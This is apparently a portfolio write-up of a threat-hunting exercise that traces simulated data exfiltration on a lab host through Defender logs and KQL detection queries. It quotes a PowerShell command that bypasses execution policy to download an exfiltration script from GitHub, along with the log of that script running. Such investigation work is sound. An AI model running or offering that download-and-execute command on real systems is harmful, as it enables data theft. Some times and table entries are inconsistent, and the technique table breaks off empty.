# üõ∞Ô∏è Data Exfiltration Simulation ‚Äî Incident Response & Detection

**Project Type:** Threat Hunting / Incident Response  
**Date Investigated:** June 21, 2025  
**Tooling:** Microsoft Defender for Endpoint (MDE), KQL (Advanced Hunting), CSV Log Analysis  
**Tags:** `PowerShell`, `Data Exfiltration`, `MITRE ATT&CK`, `Portfolio Project`

## üîç Overview

In this project, I investigated **suspected data exfiltration** behavior originating from an internal host (`khajitwares`) on the network. Through log analysis and advanced hunting queries, I was able to track the user's activity from the staging of sensitive files to the attempted use of a malicious PowerShell script.

## üß™ Initial Discovery

### üîπ File Staging

A series of sensitive files were created and staged by the user around **12:13 AM EST**, including:

- `6157_EmployeeRecords.xlsx`
- `9592_CompanyFinancials_2025.xlsx`
- `6036_ProjectList_pwncry.csv`

[Device File Events Logs](https://drive.google.com/file/d/1zwpaUh1gYOSdzXuPEkvpjMLYO2dywsR0/view?usp=sharing)

These files were stored in paths such as `C:\Users\labuser\Desktop\exfil\` ‚Äî highly indicative of intent to exfiltrate.

### üîπ Script Download and Execution

At **12:49 AM**, the attacker executed a PowerShell script named `exfiltratedata.ps1` from GitHub using the following command:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../exfiltratedata.ps1 -OutFile C:\ProgramData\exfiltratedata.ps1
```

We know this based on new file creation logs:
Jun 21, 2025 12:49:00 AM
File Created: employee-data-temp2025.csv
Path: C:\ProgramData\employeedata
Initiated By: powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\exfiltratedata.ps1

### üìä Timeline Summary 

| Time (EST)   | Event                                                              |
| ------------ | ------------------------------------------------------------------ |
| **11:31 PM** | Sensitive files manually created (CSV/XLSX)                        |
| **12:13 AM** | Sensitive files manually created (CSV/XLSX)                        |
| **12:49 AM** | Script executes and creates new file: `employee-data-temp2025.csv` |



### üßæ Detection Queries (KQL)


üîπ Search for Script Execution

```
DeviceProcessEvents
| where DeviceName == "khajitwares"
| where timestamp > ago(1d)
| where InitiatingProcessCommandLine has "exfiltratedata.ps1"
```

üîπ Review Network Activity Post-Script

```
DeviceNetworkEvents
| where DeviceName == "khajitwares"
| where Timestamp between (datetime(2025-06-21T00:49:00Z) .. datetime(2025-06-21T01:00:00Z))
| order by Timestamp desc
```

Nothing out of the ordinary was spotted following the above Query

üîπ Sensitive File Access Review

```
DeviceFileEvents
| where DeviceName == "khajitwares"
| where Timestamp > datetime(2025-06-21T00:47:00Z)
| where FileName endswith ".csv" or FileName endswith ".xlsx" or FileName endswith ".docx" or FileName endswith ".pdf" or FileName endswith ".txt"
| where ActionType in ("FileRead", "FileCreated", "FileModified", "FileAccessed", "FileDeleted")
| project Timestamp, FileName, FolderPath, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```

### üö´ Final Outcome

Despite staging sensitive business data and executing a data exfiltration script, no evidence of actual data transfer was identified. Network logs reviewed from 12:49 PM onward revealed no new or suspicious outbound connections during the timeframe expected for exfiltration.



### üîÅ Confirmed MITRE ATT&CK Techniques
| Technique ID  | Name                   | Description / Evidence                      |
